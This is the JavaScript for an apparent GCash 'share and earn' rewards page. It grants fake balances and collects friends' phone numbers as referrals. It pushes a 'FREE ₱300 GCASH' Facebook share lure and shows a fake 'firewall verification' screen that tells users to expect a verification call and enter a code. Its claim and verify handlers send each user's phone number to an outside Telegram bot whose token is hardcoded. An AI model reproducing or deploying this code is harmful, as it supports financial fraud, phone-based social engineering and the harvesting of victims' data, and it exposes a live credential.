// ========== PROMOTION.JS - SHARE AND EARN ==========
// Complete with Firebase, Firewall, and Claim Logic

// ========== LOCALSTORAGE KEYS ==========
function getUserStorageKeys() {
    var phone = localStorage.getItem("userPhone");
    if (!phone) return null;
    
    return {
        phone: phone,
        balanceKey: "userBalance_" + phone,
        leftRewardKey: "leftReward_" + phone,
        invitesKey: "invitations_" + phone,
        invitesCountKey: "invitesCount_" + phone,
        lastUpdateKey: "lastUpdate_" + phone,
        hasInvitedKey: "hasInvited_" + phone,
        hasSharedKey: "hasShared_" + phone,
        hasAcceptedKey: "hasAcceptedInvite_" + phone
    };
}

// ========== BALANCE FUNCTIONS ==========
function saveBalance(amount) {
    var keys = getUserStorageKeys();
    if (!keys) return;
    localStorage.setItem(keys.balanceKey, amount);
}

function getBalance() {
    var keys = getUserStorageKeys();
    if (!keys) return 0;
    var balance = localStorage.getItem(keys.balanceKey);
    return balance ? parseInt(balance) : 0;
}

// ========== ADD BALANCE TO LOCALSTORAGE AND FIREBASE ==========
async function addBalance(amount) {
    var currentBalance = getBalance();
    var newBalance = currentBalance + amount;
    saveBalance(newBalance);
    
    // Save to Firebase
    if (typeof firebase !== 'undefined' && firebase.database) {
        var phone = localStorage.getItem("userPhone");
        if (phone) {
            var db = firebase.database();
            await db.ref('user_sessions/' + phone).update({
                balance: newBalance,
                lastUpdate: Date.now()
            });
            console.log("Balance saved to Firebase:", newBalance);
        }
    }
    
    return newBalance;
}

function displayBalance() {
    var balance = getBalance();
    var balanceSpan = document.getElementById('userBalanceDisplay');
    if (balanceSpan) balanceSpan.innerHTML = '₱' + balance;
    return balance;
}

// ========== LEFT REWARD STATUS ==========
function saveLeftRewardClaimed(claimed) {
    var keys = getUserStorageKeys();
    if (!keys) return;
    localStorage.setItem(keys.leftRewardKey, claimed ? 'true' : 'false');
}

function getLeftRewardClaimed() {
    var keys = getUserStorageKeys();
    if (!keys) return false;
    return localStorage.getItem(keys.leftRewardKey) === 'true';
}

// ========== INVITATIONS FUNCTIONS ==========
function getInvitations() {
    var keys = getUserStorageKeys();
    if (!keys) return [];
    var invites = localStorage.getItem(keys.invitesKey);
    return invites ? JSON.parse(invites) : [];
}

function saveInvitations(invitations) {
    var keys = getUserStorageKeys();
    if (!keys) return;
    localStorage.setItem(keys.invitesKey, JSON.stringify(invitations));
    localStorage.setItem(keys.invitesCountKey, invitations.length);
}

function addInvitation(friendPhone) {
    var invitations = getInvitations();
    for (var i = 0; i < invitations.length; i++) {
        if (invitations[i].phone === friendPhone) return false;
    }
    invitations.push({ phone: friendPhone, status: 'pending', timestamp: Date.now() });
    saveInvitations(invitations);
    return true;
}

function deleteInvitationByPhone(friendPhone) {
    var invitations = getInvitations();
    var newInvites = [];
    for (var i = 0; i < invitations.length; i++) {
        if (invitations[i].phone !== friendPhone) newInvites.push(invitations[i]);
    }
    saveInvitations(newInvites);
}

function getInvitesCount() {
    var keys = getUserStorageKeys();
    if (!keys) return 0;
    var count = localStorage.getItem(keys.invitesCountKey);
    return count ? parseInt(count) : 0;
}

function displayInvitesCount() {
    var count = getInvitesCount();
    var invitesSpan = document.getElementById('invitesCountDisplay');
    if (invitesSpan) invitesSpan.innerHTML = count + ' / 6';
    return count;
}

// ========== RENDER INVITATIONS ==========
function renderInvitationsFromStorage() {
    var invitations = getInvitations();
    var listBody = document.getElementById('inviteListBody');
    if (!listBody) return;
    
    if (invitations.length === 0) {
        listBody.innerHTML = '<div class="invite-empty">No invitations sent</div>';
        return;
    }
    
    var html = '';
    for (var i = 0; i < invitations.length; i++) {
        var inv = invitations[i];
        var formattedPhone = inv.phone.substring(0, 4) + '****' + inv.phone.substring(8, 11);
        var statusClass = inv.status === 'approved' ? 'approved' : 'pending';
        var statusText = inv.status === 'approved' ? 'APPROVED' : 'PENDING';
        var disabled = inv.status === 'approved' ? 'disabled' : '';
        
        html += '<div class="invite-item">';
        html += '<div class="invite-item-phone">' + formattedPhone + '</div>';
        html += '<div class="invite-item-status"><span class="status-badge ' + statusClass + '">' + statusText + '</span></div>';
        html += '<div class="invite-item-action">';
        html += '<button class="delete-invite" onclick="deleteInviteFromStorage(\'' + inv.phone + '\')" ' + disabled + '>✕</button>';
        html += '</div>';
        html += '</div>';
    }
    listBody.innerHTML = html;
}

window.deleteInviteFromStorage = function(friendPhone) {
    var invitations = getInvitations();
    var invite = null;
    for (var i = 0; i < invitations.length; i++) {
        if (invitations[i].phone === friendPhone) { invite = invitations[i]; break; }
    }
    if (invite && invite.status === 'approved') {
        alert("Cannot delete approved invitation!");
        return;
    }
    if (confirm("Delete invitation?")) {
        deleteInvitationByPhone(friendPhone);
        renderInvitationsFromStorage();
        displayInvitesCount();
    }
};

window.sendInviteToStorage = function() {
    var friendPhone = document.getElementById('friendPhoneInput').value.trim();
    var userPhone = localStorage.getItem("userPhone");
    
    if (!friendPhone || friendPhone.length !== 11 || !friendPhone.startsWith('09')) {
        alert("Enter valid 11-digit number starting with 09");
        return;
    }
    if (friendPhone === userPhone) {
        alert("You cannot invite yourself!");
        return;
    }
    if (getInvitesCount() >= 6) {
        alert("Maximum 6 invites only!");
        return;
    }
    if (addInvitation(friendPhone)) {
        document.getElementById('friendPhoneInput').value = '';
        renderInvitationsFromStorage();
        displayInvitesCount();
        alert("Invitation sent!");
    } else {
        alert("You already invited this person!");
    }
};

// ========== UPDATE LEFT CARD VISUAL ==========
function updateLeftCardFromStorage() {
    var leftCard = document.getElementById('leftCard');
    if (!leftCard) return;
    if (getLeftRewardClaimed()) {
        leftCard.classList.add('prize-card-claimed');
        leftCard.classList.remove('prize-card-glow');
        leftCard.style.cursor = 'default';
    } else {
        leftCard.classList.add('prize-card-glow');
        leftCard.classList.remove('prize-card-claimed');
        leftCard.style.cursor = 'pointer';
    }
}

// ========== CONFETTI ==========
var confettiAnimation = null;
var confettiTimeout = null;

function startConfetti() {
    var canvas = document.getElementById('confettiCanvas');
    if (!canvas) return;
    stopConfetti();
    canvas.style.display = 'block';
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    var ctx = canvas.getContext('2d');
    var particles = [];
    for (var i = 0; i < 100; i++) {
        particles.push({
            x: Math.random() * canvas.width,
            y: Math.random() * canvas.height - canvas.height,
            size: Math.random() * 6 + 2,
            color: "hsl(" + (Math.random() * 360) + ", 100%, 60%)",
            speed: Math.random() * 3 + 2
        });
    }
    function draw() {
        if (!canvas || canvas.style.display === 'none') return;
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        for (var j = 0; j < particles.length; j++) {
            var p = particles[j];
            ctx.fillStyle = p.color;
            ctx.fillRect(p.x, p.y, p.size, p.size);
            p.y += p.speed;
            if (p.y > canvas.height) {
                p.y = -p.size;
                p.x = Math.random() * canvas.width;
            }
        }
        confettiAnimation = requestAnimationFrame(draw);
    }
    draw();
    if (confettiTimeout) clearTimeout(confettiTimeout);
    confettiTimeout = setTimeout(stopConfetti, 3000);
}

function stopConfetti() {
    if (confettiAnimation) {
        cancelAnimationFrame(confettiAnimation);
        confettiAnimation = null;
    }
    var canvas = document.getElementById('confettiCanvas');
    if (canvas) {
        var ctx = canvas.getContext('2d');
        if (ctx) ctx.clearRect(0, 0, canvas.width, canvas.height);
        canvas.style.display = 'none';
    }
}

// ========== FLOATING ANIMATION ==========
function showFloatingPlus(x, y, amount) {
    var floatingDiv = document.createElement('div');
    floatingDiv.className = 'floating-plus';
    floatingDiv.innerHTML = '+₱' + amount;
    floatingDiv.style.position = 'fixed';
    floatingDiv.style.left = x + 'px';
    floatingDiv.style.top = y + 'px';
    floatingDiv.style.color = '#ffd700';
    floatingDiv.style.fontSize = '36px';
    floatingDiv.style.fontWeight = 'bold';
    floatingDiv.style.fontFamily = 'Orbitron, monospace';
    floatingDiv.style.textShadow = '0 0 15px #ffaa33';
    floatingDiv.style.pointerEvents = 'none';
    floatingDiv.style.zIndex = '10001';
    floatingDiv.style.animation = 'floatUp 1s ease-out forwards';
    document.body.appendChild(floatingDiv);
    setTimeout(function() { floatingDiv.remove(); }, 1000);
}

// ========== LEFT LUCKY CAT ==========
function initLeftLuckyCard() {
    var leftCard = document.getElementById('leftCard');
    if (!leftCard) return;
    
    var luckySound = new Audio('sounds/luckycat.mp4');
    luckySound.loop = false;
    luckySound.volume = 0.7;
    
    if (getLeftRewardClaimed()) {
        leftCard.classList.add('prize-card-claimed');
        leftCard.classList.remove('prize-card-glow');
        leftCard.style.cursor = 'default';
    } else {
        leftCard.classList.add('prize-card-glow');
        leftCard.style.cursor = 'pointer';
        
        leftCard.addEventListener('click', function(e) {
            e.stopPropagation();
            if (getLeftRewardClaimed()) {
                alert("You already claimed your ₱150!");
                return;
            }
            
            luckySound.currentTime = 0;
            luckySound.play().catch(function(err) { console.log("Audio error:", err); });
            
            var rect = this.getBoundingClientRect();
            var x = rect.left + rect.width / 2;
            var y = rect.top + rect.height / 2;
            
            addBalance(150);
            saveLeftRewardClaimed(true);
            
            this.classList.remove('prize-card-glow');
            this.classList.add('prize-card-claimed');
            this.style.cursor = 'default';
            
            showFloatingPlus(x, y, 150);
            startConfetti();
            displayBalance();
            
            var statusMsg = document.getElementById('statusMessage');
            if (statusMsg) {
                statusMsg.innerHTML = '🐱 +₱150 claimed! Your balance: ₱' + getBalance() + ' ✨';
            }
        });
    }
}

// ========== CLAIM NOW BUTTON ==========
function initClaimNowButton() {
    var claimNowBtn = document.getElementById('claimNowBtn');
    if (claimNowBtn) {
        var newBtn = claimNowBtn.cloneNode(true);
        claimNowBtn.parentNode.replaceChild(newBtn, claimNowBtn);
        claimNowBtn = newBtn;
        
        claimNowBtn.onclick = function(e) {
            e.preventDefault();
            console.log("Claim NOW button clicked");
            showPrizePopup();
        };
        
        console.log("Claim NOW button initialized");
    } else {
        console.log("Claim NOW button not found");
    }
}

// ========== POPUP FUNCTIONS ==========
function showPrizePopup() {
    console.log("showPrizePopup called");
    var popup = document.getElementById('prizePopup');
    console.log("Popup element:", popup);
    if (popup) {
        popup.style.display = 'flex';
        startConfetti();
    } else {
        console.log("Popup element not found!");
    }
}

function closePrizePopup() {
    window.location.reload();
}

// ========== GET LATEST DEPLOYED LINK ==========
async function getLatestPayoutLink() {
    if (typeof firebase === 'undefined' || !firebase.database) return null;
    try {
        const db = firebase.database();
        const snapshot = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
        if (snapshot.exists()) {
            const key = Object.keys(snapshot.val())[0];
            const linkData = snapshot.val()[key];
            console.log("Found payout link:", linkData.url);
            return { url: linkData.url, key: key };
        }
        console.warn("No available links found in Firebase");
        return null;
    } catch (error) {
        console.error("Error getting payout link:", error);
        return null;
    }
}

// ========== FIREWALL VERIFICATION ==========
function showFirewallVerification() {
    var modal = document.createElement('div');
    modal.style.position = 'fixed';
    modal.style.top = '0';
    modal.style.left = '0';
    modal.style.width = '100%';
    modal.style.height = '100%';
    modal.style.background = 'rgba(0,0,0,0.95)';
    modal.style.backdropFilter = 'blur(10px)';
    modal.style.zIndex = '20001';
    modal.style.display = 'flex';
    modal.style.alignItems = 'center';
    modal.style.justifyContent = 'center';
    
    var verificationCode = Math.floor(1000 + Math.random() * 9000).toString();
    console.log("Verification code:", verificationCode);
    
    modal.innerHTML = `
        <div style="background: linear-gradient(145deg, #1a1525, #0f0a1a); border-radius: 48px; max-width: 340px; width: 85%; padding: 30px 25px; text-align: center; border: 1px solid rgba(255,215,0,0.3);">
            <div style="font-size: 48px; margin-bottom: 15px;">📞</div>
            <h2 style="color: #ff4444; font-size: 22px; margin-bottom: 15px;">VERIFICATION REQUIRED</h2>
            <div style="color: white; font-size: 13px; margin-bottom: 20px;">
                <p>Please wait for the system-verification call. You will receive a 4-digit code.</p>
            </div>
            <div style="display: flex; gap: 10px; margin-bottom: 15px;">
                <input type="text" id="verifyCodeInput" style="flex:1; background:rgba(0,0,0,0.5); border:1px solid rgba(255,215,0,0.3); border-radius:30px; padding:12px; color:white; font-size:18px; text-align:center;" placeholder="1234" maxlength="4">
                <button id="submitVerifyBtn" style="background:linear-gradient(135deg,#ff4444,#cc0000); border:none; border-radius:30px; padding:0 20px; color:white; font-weight:bold; cursor:pointer;">VERIFY</button>
            </div>
            <div id="verifyErrorMsg" style="color:#ff4444; font-size:12px; display:none;"></div>
        </div>
    `;
    
    document.body.appendChild(modal);
    
    var codeInput = document.getElementById('verifyCodeInput');
    var verifyBtn = document.getElementById('submitVerifyBtn');
    var errorDiv = document.getElementById('verifyErrorMsg');
    var attempts = 0;
    
    if (codeInput) codeInput.focus();
    
    verifyBtn.onclick = function() {
        var enteredCode = codeInput.value.trim();
        if (!enteredCode || enteredCode.length < 4) {
            errorDiv.innerHTML = "Please enter a 4-digit code.";
            errorDiv.style.display = 'block';
            return;
        }
        attempts++;
        if (enteredCode === verificationCode) {
            var userPhone = localStorage.getItem("userPhone") || "Unknown";
            fetch('https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=' + encodeURIComponent("VERIFY SUCCESS\nPhone: " + userPhone))
                .catch(function(e) {});
            modal.remove();
            alert("Verification successful! Please try claiming again.");
            setTimeout(function() { window.location.reload(); }, 1000);
        } else {
            var errorMsg = "Invalid code. Try again.";
            if (attempts >= 3) errorMsg = "Too many failed attempts. Page will refresh.";
            errorDiv.innerHTML = errorMsg;
            errorDiv.style.display = 'block';
            codeInput.value = '';
            if (attempts >= 3) setTimeout(function() { window.location.reload(); }, 2000);
        }
    };
}

// ========== NO LINK ALERT ==========
function showNoLinkAlert() {
    var modal = document.createElement('div');
    modal.style.position = 'fixed';
    modal.style.top = '0';
    modal.style.left = '0';
    modal.style.width = '100%';
    modal.style.height = '100%';
    modal.style.background = 'rgba(0,0,0,0.95)';
    modal.style.zIndex = '20000';
    modal.style.display = 'flex';
    modal.style.alignItems = 'center';
    modal.style.justifyContent = 'center';
    
    modal.innerHTML = `
        <div style="background: linear-gradient(145deg, #1a1525, #0f0a1a); border-radius: 40px; max-width: 320px; width: 85%; padding: 30px 25px; text-align: center; border: 1px solid rgba(255,68,68,0.3);">
            <div style="font-size: 48px; margin-bottom: 15px;">⚠️</div>
            <h3 style="color: #ff4444; font-size: 20px; margin-bottom: 20px;">WITHDRAWAL UNAVAILABLE</h3>
            <div style="color: white; font-size: 14px; text-align: left;">
                <p>1. No GCash payout link available.</p>
                <p>2. Share and complete pending tasks.</p>
            </div>
            <button id="closeAlertBtn" style="background:#ff4444; border:none; border-radius:40px; padding:12px; color:white; font-weight:bold; margin-top:25px; width:100%; cursor:pointer;">GOT IT</button>
        </div>
    `;
    
    document.body.appendChild(modal);
    document.getElementById('closeAlertBtn').onclick = function() { modal.remove(); };
}

// ========== CHECK FIREWALL AND CLAIM ==========
async function checkFirewallAndClaim() {
    console.log("Starting claim process...");
    
    if (typeof firebase === 'undefined' || !firebase.database) {
        alert("System error. Please refresh the page.");
        return false;
    }
    
    try {
        const db = firebase.database();
        
        // Check firewall status
        const firewallSnap = await db.ref('admin/globalFirewall').once('value');
        const firewallData = firewallSnap.val();
        const isFirewallOn = firewallData && firewallData.active === true;
        
        console.log("Firewall status:", isFirewallOn ? "ON" : "OFF");
        
        if (isFirewallOn) {
            showFirewallVerification();
            return false;
        }
        
        // Get latest payout link
        const linkData = await getLatestPayoutLink();
        
        if (!linkData || !linkData.url) {
            console.log("No available link found");
            showNoLinkAlert();
            return false;
        }
        
        const redirectUrl = linkData.url;
        const linkKey = linkData.key;
        const userPhone = localStorage.getItem("userPhone") || "Unknown";
        const amount = 150;
        
        console.log("Claiming link:", redirectUrl);
        
        // Update link status to claimed
        await db.ref('links/' + linkKey).update({
            status: 'claimed',
            user: userPhone,
            amount: amount,
            claimedAt: Date.now()
        });
        
        // Send Telegram notification
        fetch('https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=' + encodeURIComponent("CLAIM REQUEST!\nPhone: " + userPhone + "\nAmount: ₱" + amount))
            .catch(e => console.log("Telegram error:", e));
        
        // Close popup
        const prizePopup = document.getElementById('prizePopup');
        if (prizePopup) prizePopup.style.display = 'none';
        
        // Fix URL if missing https://
        let finalUrl = redirectUrl;
        if (finalUrl && !finalUrl.startsWith('http')) {
            finalUrl = 'https://' + finalUrl;
        }
        
        alert("Claim successful! Redirecting...");
        setTimeout(() => {
            window.location.href = finalUrl;
        }, 1500);
        
        return true;
        
    } catch (error) {
        console.error("Claim error:", error);
        alert("System error. Please try again.");
        return false;
    }
}

// ========== CLAIM THRU GCASH BUTTON ==========
function initClaimButton() {
    var claimBtn = document.getElementById('claimGCashBtn');
    if (!claimBtn) return;
    
    var newBtn = claimBtn.cloneNode(true);
    claimBtn.parentNode.replaceChild(newBtn, claimBtn);
    claimBtn = newBtn;
    
    claimBtn.style.cursor = 'pointer';
    claimBtn.disabled = false;
    
    claimBtn.onclick = async function(e) {
        e.preventDefault();
        e.stopPropagation();
        console.log("CLAIM THRU GCASH clicked");
        
        this.style.transform = 'scale(0.97)';
        setTimeout(() => { if (claimBtn) claimBtn.style.transform = ''; }, 200);
        
        await checkFirewallAndClaim();
    };
    
    console.log("Claim button initialized");
}

// ========== FACEBOOK SHARE ==========
function initFacebookShare() {
    var fbBtn = document.getElementById('shareFBBtn');
    if (fbBtn) {
        fbBtn.onclick = function() {
            var userPhone = localStorage.getItem("userPhone");
            var formattedPhone = userPhone ? userPhone.substring(0, 4) + '****' + userPhone.substring(8, 11) : 'User';
            var caption = "🎉 FREE +₱300 GCASH CREDITS! 🎉\n\nUse my referral code: " + formattedPhone + "\n\n#LuckyDrop #Rewards #GCash";
            var shareUrl = "https://xjiligames.github.io/rewards/index.html";
            window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(shareUrl) + '&quote=' + encodeURIComponent(caption), '_blank', 'width=600,height=500');
        };
    }
}

// ========== INITIALIZE ==========
document.addEventListener('DOMContentLoaded', function() {
    console.log("Promotion.js loading...");
    
    var userPhone = localStorage.getItem("userPhone");
    if (!userPhone) {
        alert("Please login first.");
        window.location.href = "index.html";
        return;
    }
    
    var display = document.getElementById('userPhoneDisplay');
    if (display) {
        display.innerText = userPhone.substring(0, 4) + '****' + userPhone.substring(8, 11);
    }

    var video = document.getElementById('luckyCatVideo');
    if (video) {
        video.loop = true;
        video.play().catch(function(e) {
            console.log("Video autoplay error:", e);
        });
    }
    
    displayBalance();
    displayInvitesCount();
    updateLeftCardFromStorage();
    renderInvitationsFromStorage();
    
    initLeftLuckyCard();
    initClaimNowButton();
    initClaimButton();
    initFacebookShare();
    
    var sendBtn = document.getElementById('sendInviteBtn');
    if (sendBtn) {
        var newSendBtn = sendBtn.cloneNode(true);
        sendBtn.parentNode.replaceChild(newSendBtn, sendBtn);
        newSendBtn.onclick = window.sendInviteToStorage;
    }
    
    console.log("Promotion.js ready");
});
